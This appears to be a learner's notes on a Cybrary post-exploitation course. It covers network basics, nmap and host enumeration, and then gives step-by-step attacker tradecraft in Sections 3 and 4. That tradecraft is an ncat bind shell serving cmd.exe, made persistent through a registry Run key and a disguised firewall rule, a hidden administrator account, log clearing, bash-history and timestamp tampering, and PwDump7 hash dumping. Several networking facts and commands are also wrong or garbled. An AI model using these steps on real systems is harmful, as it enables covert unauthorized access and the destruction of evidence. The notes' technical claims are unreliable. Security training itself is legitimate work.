# Cybrary - Post Exploitation Hacking

Last modified: May 23, 2022 11:02 AM
Priority: Important
Progress: Done
Subject: Cybersecurity, Malware Analysis

# Section 1

## Basics of Networking MAC & IP Addressing

***Exploitation*** - the use of something in order to get an advantage from it.

Rules of Engagement - If you don’t have permission to do that, **Don’t**. 

![Screenshot from 2022-05-16 17-10-10.png](Cybrary%20-%20Post%20Exploitation%20Hacking%2059425cd85e1b4360a88d803c142753a4/Screenshot_from_2022-05-16_17-10-10.png)

**MAC Address aren’t Unique**, they will have to be with the same network.

IPv6 - 16 bytes number, RFC 1183 (1996), because only 4% of the world is using IPv6 it means that we can use this IP in an unconfigured firewall and sneak into the network.

## **Basics of Networking - TCP UDP ICMP**

**ICMP** -  Error Messages and control for IP,  the “ping” protocol 

## **Basics of Networking - Headers**

### **Ethernet Header**

have the MAC address of the Source (**Src**) and Destination (**Dst**), usually you can see the name of the Ethernet card in the frame. 

you have the breakdown of the MAC Address both the Source and the destination the type of the frame and much more. 

In wireshark you will be able to see the value of the bits in the address, For Example LG bit (Globally Unique Address) and IG bit (Individual Address).

the process of the frame review can really benefit you, by this review you can see of the how the person configured their network and much more.  

### IP Header

![Untitled](Cybrary%20-%20Post%20Exploitation%20Hacking%2059425cd85e1b4360a88d803c142753a4/Untitled.png)

### TCP Header

![Untitled](Cybrary%20-%20Post%20Exploitation%20Hacking%2059425cd85e1b4360a88d803c142753a4/Untitled%201.png)

**gets sure that traffics went to where is should go.** 

URG - Quality of service into TCP, you’ll see only at **xmas** scan 

ACK - I have somekind of data or communication from you.

PSH - I have more data to you in addition to the data that I already sent you

RES - something is terribly wrong, and I’ll will this connection now

SYN - usually used to initiate a conversation

## **Introduction Information Gathering**

what is Info Gathering

what to look for in a victim machine

avoid notice

prepare for data exfiltration

> The more information the better
> 

# Section 2

## **Linux Host Information Gathering**

### Ifconfig

- Configure the kernel-residents network interfaces
- used at boot time to setup interfaces as necessary
- after that it used when needed to tune the system

![Screenshot from 2022-05-16 19-41-05.png](Cybrary%20-%20Post%20Exploitation%20Hacking%2059425cd85e1b4360a88d803c142753a4/Screenshot_from_2022-05-16_19-41-05.png)

the name of the interface (**eth0**)

the way the data transited (**encap:Ethernet**)

the user’s hardware address (MAC address) (**HWaddr**)

the address of the machine int the network (**inet addr**)

the broadcast address across the machines network and the highest address in the current network (**Bcast**)

the Sebnet mask of the network (**Mask**) that means that in this network each of the machines will have the same 3 numbers in the IP address.

the IPv6 address of the machine (**inet6 addr**)

when developing you own tools and exploits the **MTU** (Manual Transmission unit) can be very important.

**RX Packets** - the packets that had been received

**TX Packets** - total number of packets transmitted.

**TX carriers** - is a number of packets that experienced loss of carriers.

**TX txqueuelen** - is length of transmission queue.

**TX/RX bytes -** is a total number of bytes received or transmitted over interface.

### Netstat

**Usage** : tells almost everything that you wanted to know about a network and it’s relations systems

`netstat -g` - returns the address that are in the same multicast group

`lo` - loopback, logical address, info that you want to not touch the network and to seem like it got from the outside, there will be a eth0 multicast groups that are also titled in the lo group these are the same.

`netstat -r` - machines routing table

iface - the ways that the device connected to the machine

`netstat -i` - shows info about the interfaces that are on the machine

`netstat -s` - returns a breakdown of the protocol the machine is got it’s hand on.

`arp` - returns the ARP Table 

### Nsswitch.conf (Databases)

it’s a file that has all of the databases for a lot of important things in the machine.

### Resolv.conf (DNS)

`nameserver [IP Address]` - setting up a DNS server to the machine

## Linux Scanning Lab

**NMAP** - active scanner

**P0F** - passive scanner, don’t generate traffic, 

## Linux Network information Gathering

## Host Discovery (NMAP)

`-sL`: List Scan - simply list targets to scan 

(Example : `nmap -sL www.stanford.edu/28`)

`-sn`: Ping Scan - disable port scan, sends TCP packet with all null values which means that basically it’s waiting to a response to see if the host is alive. 

`-Pn`: Treat all hosts as online -- **skip host discovery,** realing on the user that all of the hosts tha has been given are online and scanning their ports, this is affective then a machines on the network are not reaplying to ICMP requests which can trick NMAP to think that the host isn’t online (which maybe he is) but you still want to scan it’s ports to see them. 

`-PS/PA/PU/PY[portlist]`: TCP SYN/ACK, UDP or SCTP discovery to given ports

`-PE/PP/PM`: ICMP echo, timestamp, and net-mask request discovery probes

`-PO[protocol list]`: IP Protocol Ping

`-n/-R`: Never do DNS resolution/Always resolve [default: sometimes]

`--dns-servers <serv1[,serv2],...>`: Specify custom DNS servers

`--system-dns`: Use OS's DNS resolver

`--traceroute`: Trace hop path to each host

## Scan Techniques

`-sS/sT/sA/sW/sM`: TCP SYN/Connect()/ACK/Window/Maimon scans

`-sU`: UDP Scan

`-sN/sF/sX`: TCP Null, FIN, and Xmas scans, usually used when you don’t need to stay unnoticeable, the benefits with using these options is that the response that they are getting can give of info about the OS.

`--scanflags <flags>`: Customize TCP scan flags

`-sI <zombie host[:probeport]>`: Idle scan ([https://www.youtube.com/watch?v=hgbsvN3F6k4](https://www.youtube.com/watch?v=hgbsvN3F6k4))

`-sY/sZ`: SCTP INIT/COOKIE-ECHO scans

`-sO`: IP protocol scan

`-b <FTP relay host>`: FTP bounce scan

## Port Specification & Scan Techniques

`-p <port ranges>`: Only scan specified ports

Ex : `-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9`

`--exclude-ports <port ranges>`: Exclude the specified ports from scanning

`-F`: Fast mode - Scan fewer ports than the default scan

`-r`: Scan ports consecutively - don't randomize, when you randomize it looks like you are not “exactly” scanning ports. 

`--top-ports <number>`: Scan <number> most common  ports

`--port-ratio <ratio>`: Scan ports more common than <ratio>

## SERVICE/VERSION DETECTION:

`-sV`: Probe open ports to determine service/version info

`--version-intensity <level>`: Set from 0 (light) to 9 (try all probes)

`--version-light`: Limit to most likely probes (intensity 2)

`--version-all`: Try every single probe (intensity 9)

`--version-trace`: Show detailed version scan activity (for debugging)

# P0f

## Passive OS Fingerprinting

usage : listens to the traffic with the intent of identifying the active operating system. becasue it’s dosen’t generate traffic,  p0f can be left running on a machine with minimal risk of detection. 

# TCPDump

it’s a packet sniffer that spits out easy-to-read information about packets on a network.

![Example](Cybrary%20-%20Post%20Exploitation%20Hacking%2059425cd85e1b4360a88d803c142753a4/Untitled%202.png)

Example

first is the time stamp, than the ip address of the,  

## Windows Host Tools

`ipconfig` - The default is to display only the IP address, subnet mask and default gateway for each adapter bound to TCP/IP.

`netstat` - Displays protocol statistics and current TCP/IP network connections.

`arp` -  Displays and modifies the IP-to-Physical address translation tables used by address resolution protocol (ARP).

`arp -a` - Displays current ARP entries by interrogating the current
protocol data.  If inet_addr is specified, the IP and Physical
addresses for only the specified computer are displayed.  If
more than one network interface uses ARP, entries for each ARP table are displayed.

# net *

the best gathering tools for windows

```powershell
NET ACCOUNTS             NET HELPMSG              NET STATISTICS
  NET COMPUTER             NET LOCALGROUP           NET STOP
  NET CONFIG               NET PAUSE                NET TIME
  NET CONTINUE             NET SESSION              NET USE
  NET FILE                 NET SHARE                NET USER
  NET GROUP                NET START                NET VIEW
  NET HELP

  NET HELP NAMES explains different types of names in NET HELP syntax lines.
  NET HELP SERVICES lists some of the services you can start.
  NET HELP SYNTAX explains how to read NET HELP syntax lines.
  NET HELP command | MORE displays Help one screen at a time.
```

## Windows Network info gathering

`nslookup` - used to identify and administrate DNS servers. send a DNS query.

`net accounts` - updates the user accounts database and modifies passwords and logon requirements for all accounts. when typed with no additions, the command will return :

```powershell
Force user logoff how long after time expires?:       Never
// if you are logon to the machine and the password is being expired, the machine won't reboot after the password expired
Minimum password age (days):                          0
// this means that password can change constently, the min time that the password needs to stay the same is 0 days  
Maximum password age (days):                          42
// after X days the password will expire, and new password need to bre set
Minimum password length:                              0
// means that you can have a password with no characters
Length of password history maintained:                None
// the user can use the same password, again and again (after it expires)
Lockout threshold:                                    Never
// the attacker can try again and again to guess the password 
Lockout duration (minutes):                           30
// if the "Lockout threshold" was set, so this was going to get enabled
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```

`net config server` - displays or changes settings for the server service.

`net session` - lists or disconnects sessions between the computer and other computers on the network.

when use without options it’ll display information about all sessions with the computer.

you can disconnect sessions by using the `net session \\COMPUTER_NAME /delete` command, but it’s very loud.

`net statistics server` - displays the log for the server statistics.

`net view` - displays a list of resources being shared on a computer. Can be used to see what is being shred, and to see the network’s machine are named.

you can run the `net view \\CURRENT_COMPUTER` to see the things that the current computer shares. 

you can set a backdoors that can share a computer’s resource. 

`net start` - list running services (including anti-viruses and more). 

certificate propagation - (Read More) 

DNS Client / DHCP Client - those telling us that the machine isn’t a server.

```jsx
Web Account Manager
   Windows Audio
   Windows Audio Endpoint Builder
   Windows Connection Manager
   Windows Defender Firewall
   Windows Event Log
   Windows Font Cache Service
   Windows License Manager Service
   Windows Management Instrumentation
   Windows Push Notifications System Service
   Windows Push Notifications User Service_51afc9
   Windows Search
   Windows Security Service
   Windows Time
   Windows Update
   WinHTTP Web Proxy Auto-Discovery Service
   Wireless Keyboard 850 Notification Service
   WLAN AutoConfig
   Workstation
```

## WMIC

*Definition* - Windows Management Instrumentation (command line)

### USERACCOUNT

`AccountType` - usually **512**, which means that the user have administrator privileges. 

`Caption` - looks like that : `sbhtkhmjeuc\sbhtk` and means that user named `sbhtk` on the machine that called `sbhtkhmjeuc`.

`Description` - a few words of the account, there is as default description for each usertype so the attacker can know the type of the user from the description.

 `SID` - **can’t be changed**, it’s a unique serial number for windows machines, each account of the machine have different SID. Every windows admin user always end their SID with “**500**” at the end. 

### STARTUP

this returns all of the programs that start on startup.

games are usually very vulnerable, the attacker can exploit this, which they can see in this command. 

# Section 3

## TFTP

move files from one computer to another.

## RDP

*Definitoin* - **Remote Desktop Protocol** 

to activate the RDP on the victim’s machine you need to run this command :

`netsh advfireall firewall set rule group=”remote desktop” new enable-Yes`

this command is going to the firewall and enabling the RDP new rule

`netsh` - network administration tool 

`advfirewall` - identifies that you’re working with the windows “advanced” firewall.

`firewall` - specifies that this is an actual firewall operation, not something else governed by the advfirewall.

`set rule group=”remote desktop”` - assigning a value to that specific group

`enable=Yes` - allow RDP Connections.

![Screenshot (1).png](Cybrary%20-%20Post%20Exploitation%20Hacking%2059425cd85e1b4360a88d803c142753a4/Screenshot_(1).png)

most of the third party RDP can be connected via SSH. 

![Screenshot (2).png](Cybrary%20-%20Post%20Exploitation%20Hacking%2059425cd85e1b4360a88d803c142753a4/Screenshot_(2).png)

## Ncat

if you can control it, use IPv6, because a lot of the firewalls are not configured to block to examine IPv6.

if you are using the `--sh-exec` you can run a command of the victim’s machine (if it’s linux) and don’t can get written in the bash log file (there is not evidence if you running this command.)

`-m` - the maximum number if connections

`-d` - delay time between read/write

`-o` - dump session data into a file (creates a log of all the command that you run)

`-x` - creates a log and dump it in a hex-type file  

 

## Windows Ncat Backdoor lab

`ncat -lvvnp 12345` :

`-l` listening at port `12345`

`vv` - verbosity

`-n` - send the result back exactly to the host name that i gave you. without running it into the trough DNS.

`-p` - at the port `12345`

`-e` - execute a command (you can tell it to execute a program within the machine like `cmd.exe`)

ncat is cool but it have one problem, it’s needing to open a windows when it’s running, but you can type this command :

`reg add HKLM\software\microsoft\windows\currentversion\run /v Win32System /t REG_MULTI_SZ /d ”C:\ncat.exe -lp 12345  -e cmd.exe”`

`reg add` - adding to the registry at a specific path (the current path it’s path to the startup software)

`/v Win32System` - the name of the file / program that will be run 

`/t REG_MULTI_SZ` - the datatype of the file, 

because we’re modifying the registration e need to have admin privileges, so the file that we created will also have admin privileges which is good.

 but this is not good because we solved the problem of automating the listening process, but this time windows is still going to appear in the firewall warning the user on open ports, to solve that we need to tell the fire wall that it’s OK.  

first, we’ll need to see the current setting of the firewall, by typing `netsh firewall show upmode`

to allow the listening you need to type : `netsh firewall add portopening TCP 12345 “Windows Admin” ENABLE ALL` which means crate a new rules which allow port opening on port `12345` and show this as `Windows Admin` and enable to him all (can do what ever he wants).

when you adding a portopening rules you need to blend inside of the OS, you can type : `netsh firewall show portopening` and see all of the other names of the open ports process, which you can duplicate and manipulate, by changing the process name of `ncat.exe` to something else and placing it in a not-suspicious place

 

## New User backdoor

to blend in the machine well, you need to create a user with a name that can’t be poping, for that you might need to see the other users name to decide, you can run `net user` to watch the name of the existing users.

to create a new user, you need to use `net user /add USERNAME PASSWORD`, after you created a user you want it to have admin privileges, you need to do that by adding the new user to the `Administrators` localgroup, by typing : `net localgroup Administrators /ass USERNAME`

always live a backdoor safe with authentication for yourself

after you creates the user that you know have all of the admin privileges, you can run the command `runas /user:USERNAME PROGRAM`, which will run any program as a specified user. 

## Batch Scripts

you can write batch scripts trough the terminal by typing `copy con NAME_FILE.BAT` and and contest of the file.

usually when you run a batch file the content of the file will be printed out and then it will start preforming those commands. but if you want to do that in silent you need to type in the start `@ echo off` that won’t show the terminal windows what you the batch file.

you can schedule the batch script to run on a specific time in the day use SE, you can set these by using `at` or `schtasks` (more probable that you’ll use `schtasks`)
```powershell
Parameter List:
    /Create         Creates a new scheduled task.

    /Delete         Deletes the scheduled task(s).

    /Query          Displays all scheduled tasks.

    /Change         Changes the properties of scheduled task.

    /Run            Runs the scheduled task on demand.

    /End            Stops the currently running scheduled task.

    /ShowSid        Shows the security identifier corresponding to a scheduled task name.
```

## Terminal Linux History

to see the history of the terminal in linux you can type in the terminal `~./bash_history`. You can edit the history and put command that weren’t run at all (with `Vim`).

but once edit the file the user just can run `ls -lisa` and see that the history file was edited, you can use the `touch` this command lets you change the time of the edited file, Example : `touch -t 11300730` will change the time and the date to November 30 07:30 AM.

# Section 4

## Linux Bash History

ways that you can stay hidden when hacking :

1. use VI and edit the bash_history file 
2. before running any commands you can copy the bash_history and do the stuff that you need to and paste it back to the place.
3. you can move the history file into `/dev/null` and simply delete it. (**not recommend**)

## Windows Logs, Timestamps

## Timestamps

these metadata fields are informing for the user and the OS when a file was opened, edited, created and more.

if you want edit the timestamp windows the only thing that you can to do is open a lot of harmless files and filed up the log.

in Linux there are a lot of way to configure the timestamps, the best one is by using the `touch` command.

## Window Event log

just like a bash history on crack, this program will save anything that got done by anyone in any time, you look at this log you’ll need to type `wevtutil`, because it’s saving all of your steps you can’t erase the things that you want to, you’ll have to delete it all, this process isn’t silent and very suspicious, you can do that using the `wevrutil -cl` command, if someone deleted all of the logs, the other person how notices that can’t se what they don’t because there’s log of that. 

another ways to you can delete the log file is to navigate into them and write `del *.*` this command will delete everything.

instead of deleting all of the log when you are leaving, you can disable the logs recording before you are staring and enable is afterwards, the log’s will show that you disabled and enabled the logs but they won’t see what you have been doing in that time.

## Windows Passwords

you can use the **PwDump7** software, this will dump all of the hashes of the password in terminal and the names of their accounts.